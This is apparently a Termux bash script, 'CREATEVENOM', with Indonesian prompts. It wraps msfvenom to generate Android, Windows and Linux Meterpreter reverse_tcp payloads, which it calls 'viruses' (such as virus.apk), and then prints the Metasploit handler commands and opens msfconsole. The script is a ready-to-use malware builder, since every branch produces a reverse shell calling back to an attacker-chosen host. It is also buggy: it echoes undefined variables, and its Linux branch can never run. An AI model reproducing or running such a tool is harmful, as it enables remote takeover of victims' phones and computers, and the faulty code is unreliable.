biru='\033[34;1m' #biru 
green='\e[0;32m' #hijau muda 
daun='\033[32;1m' #ijo 
purple='\033[35;1m' #purple 
cyyan='\033[36;1m' #cyan 
merah='\033[31;1m' #merah 
putih='\033[37;1m' #pur 
tai='\033[33;1m' #kuning 
pkg install figlet -y 
pkg install python -y 
pkg install python2 -y 
pip install lolcat 
pip2 install lolcat 
gem install lolcat 
clear

###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo $tai"["$daun"!"$tai"]>"$merah" CTRL + C Detected !!!"
sleep 0.1
echo $tai"["$daun"!"$tai"]>"$merah" Tunggu 4 Detik"
sleep 4
echo
echo
exit
}

figlet -f slant "CREATEVENOM" | lolcat
echo
echo
echo $biru "++[==============================================]++"
sleep 2
echo $tai  "    Pastikan Anda Sudah Menginstall Metasploit"
sleep 1
echo $tai  "    Author = sadamalsharabi"
sleep 1
echo $tai  "    Version = 0.1"
sleep 1
echo $tai  "    Name Tools = CREATEVENOM"
echo $biru "++[==============================================]++"
echo
echo $putih " ++[ Masukan Pilihan Anda ]++"
echo $tai "["$daun"!"$tai"]"$merah" Android Payload"
sleep 0.2
echo $tai "["$daun"!"$tai"]"$merah" Windows Payload"
sleep 0.2
echo $tai "["$daun"!"$tai"]"$merah" Linux Payload"
sleep 0.2
echo $daun
read -p "<[Masukan Pilihan Anda]> " venom

if [ $venom = "1" ] || [ $venom = "01" ]
then
echo $tai
read -p "<[ Masukan Ip Anda ]> " ipandroid
echo
echo $merah "IP = "$daun"$ip"
echo $tai
read -p "<[ Masukan Port ]> " portandroid
echo
echo $merah "PORT = "$daun"$port"
echo
echo $biru " Saya merekomendasikan misalnya virus.apk"
echo $tai
read -p "<[ Masukan Nama Virus ]> " android
echo
clear
echo $tai "Sedang Membuka Folder Metasploit"
cd
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ipandroid LPORT=$portandroid R> $android.apk
echo
echo $tai "Pembuatan Virus Sudah Selesai"
sleep 1
echo
echo $tai  "++[================================================]++"
echo $daun "         Masukan Perintah Ini Di Metasploit"
echo $tai  "++[================================================]++"
echo $daun "     use multi/handler"
echo $daun "     set payload android/meterpreter/reverse_tcp"
echo $daun "     set lhost $ip"
echo $daun "     set lport $port"
echo $daun "     exploit"
echo $tai  "++[================================================]++"
echo
echo $daun " Membuka Metasploit"
sleep 1
cd
msfconsole
fi

if [ $venom = "2" ] || [ $venom = "02" ]
then
echo $tai
read -p "<[ Masukan Ip Anda ]> " ipwindows
echo
echo $merah "IP = "$daun"$ip"
echo $tai
read -p "<[ Masukan Port ]> " portwindows
echo
echo $merah "PORT = "$daun"$port"
echo
echo $biru " Saya merekomendasikan misalnya virus.apk"
echo $tai
read -p "<[ Masukan Nama Virus ]> " windows
echo
clear
echo $tai "Sedang Membuka Folder Metasploit"
cd
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipwindows LPORT=$portwindows R> $windows.exe
echo
echo $tai "Pembuatan Virus Sudah Selesai"
sleep 1
echo
echo $tai  "++[================================================]++"
echo $daun "         Masukan Perintah Ini Di Metasploit"
echo $tai  "++[================================================]++"
echo $daun "     use multi/handler"
echo $daun "     set payload windows/meterpreter/reverse_tcp"
echo $daun "     set lhost $ip"
echo $daun "     set lport $port"
echo $daun "     exploit"
echo $tai  "++[================================================]++"
echo
echo $daun " Membuka Metasploit"
sleep 1
cd
msfconsole
fi

if [ $venom = "2" ] || [ $venom = "02" ]
then
echo $tai
read -p "<[ Masukan Ip Anda ]> " iplinux
echo
echo $merah "IP = "$daun"$ip"
echo $tai
read -p "<[ Masukan Port ]> " portlinux
echo
echo $merah "PORT = "$daun"$port"
echo
echo $biru " Saya merekomendasikan misalnya virus.apk"
echo $tai
read -p "<[ Masukan Nama Virus ]> " linux
echo
clear
echo $tai "Sedang Membuka Folder Metasploit"
cd
msfvenom -p linux/meterpreter/reverse_tcp LHOST=$iplinux LPORT=$portlinux R> $linux.elf
echo
echo $tai "Pembuatan Virus Sudah Selesai"
sleep 1
echo
echo $tai  "++[================================================]++"
echo $daun "         Masukan Perintah Ini Di Metasploit"
echo $tai  "++[================================================]++"
echo $daun "     use multi/handler"
echo $daun "     set payload linux/x86/meterpreter/reverse_tcp"
echo $daun "     set lhost $ip"
echo $daun "     set lport $port"
echo $daun "     exploit"
echo $tai  "++[================================================]++"
echo
echo $daun " Membuka Metasploit"
sleep 1
cd
msfconsole
fi
